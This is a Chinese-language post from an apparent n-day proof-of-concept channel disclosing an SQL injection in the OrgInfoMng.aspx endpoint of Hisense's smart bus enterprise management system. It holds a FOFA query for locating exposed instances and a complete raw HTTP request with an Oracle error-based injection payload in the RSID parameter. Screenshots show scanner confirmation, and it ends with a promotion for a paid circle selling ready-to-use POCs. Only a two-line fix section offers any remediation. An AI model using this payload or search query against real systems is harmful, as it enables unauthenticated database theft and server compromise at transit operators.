#  海信智能公交企业管理系统 OrgInfoMng.aspx SQL注入漏洞   
Superhero  nday POC   2024-11-25 02:12  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
海信智能公交企业管理系统是一套以智慧车、智慧站、智慧场为基础，以大数据和人工智能技术的公交云脑为核心，旨在全面提升公交企业的安全保障能力、运营生产效率、企业管理水平、决策分析能力和乘客出行体验的综合管理系统。基于大数据和人工智能技术构建的核心处理平台，具有数据接入处理能力、逻辑推理能力以及微服务架构的智慧公交五大应用能力。它能够对收集到的各种数据进行分析和处理，为企业管理提供智能化决策支持。  
  
  
**01******  
  
**漏洞概述**  
  
  
海信智能公交企业管理系统 OrgInfoMng.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:   
```
body="var _FactoryData"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIZGXIAwKO6U1nRGsmceKFKCqQwJdmX2EtpfGFicURKAyzoAO3fS7JE8VfiaCm1tFQBrvD8CiapkL3VQ/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
GET /Erp/ErpAdmin/Form/OrgInfoMng.aspx?RSID=1%27+AND+9512%3DCTXSYS.DRITHSX.SN%289512%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%289512%3D9512%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%29--+sfjW HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIZGXIAwKO6U1nRGsmceKFKNKGfrKVRhpiaGSC8oeBXO9sInz1fWI5gm3rMuB6a00RMeluicIrA2DPA/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIZGXIAwKO6U1nRGsmceKFKhTzW5DTBalFaHVjcGgEH113VbI5w3fRzVsaOVoichibibWtB9qKtc5JUA/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIZGXIAwKO6U1nRGsmceKFKLdiaoZus0pqbu3pYdXf13iciaRjhl7FiawCBXqJuggrg7la7dicr0icqeB6g/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIZGXIAwKO6U1nRGsmceKFKhvgpuJssKZvfF5zFRs7bhibqo8iaE0rSiaBPY3meayTtNRicokwoqb1WEg/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwIZGXIAwKO6U1nRGsmceKFK5Hxwdnib2rMHuxm8lbOazhukAmVEW89ZjziahOibGzGQL3eA4RdetibkvA/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。   
  
2、三款工具都支持内置poc+自写poc目录一起扫描。   
  
3、保持每周更新10-15个poc。   
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
